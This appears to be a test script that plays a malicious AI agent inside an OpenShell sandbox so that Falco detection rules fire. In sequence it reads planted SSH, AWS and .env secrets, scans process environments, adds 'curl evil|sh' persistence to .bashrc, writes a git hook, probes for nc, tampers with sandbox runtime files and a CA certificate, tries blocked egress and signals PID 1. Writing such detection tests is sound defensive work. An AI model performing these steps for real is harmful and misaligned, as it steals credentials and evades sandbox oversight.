# Simulated malicious agent. Runs inside an OpenShell sandbox; each step should
# trigger one OpenShell Falco rule (see falco/openshell_rules.yaml).
cd /sandbox; mkdir -p .ssh .aws proj/.git/hooks
echo k > .ssh/id_ed25519; echo k > .aws/credentials; echo SECRET=1 > proj/.env
cat .ssh/id_ed25519 .aws/credentials proj/.env >/dev/null           # credential access
for p in /proc/[0-9]*; do cat $p/environ >/dev/null 2>&1; done       # process environment
echo "curl evil|sh" >> ~/.bashrc; echo x > proj/.git/hooks/pre-commit # persistence
command -v nc >/dev/null && nc -h >/dev/null 2>&1                    # network tool
echo pwn > /.openshell/x 2>/dev/null                                 # runtime tampering
rm -f /run/openshell-supervisor-ca/material/ca.crt 2>/dev/null       # runtime tampering (unlink)
python3 -c 'import socket; socket.create_connection(("1.1.1.1", 443), 3)' 2>/dev/null  # blocked egress
kill -TERM 1 2>/dev/null                                             # signal the runtime
echo done
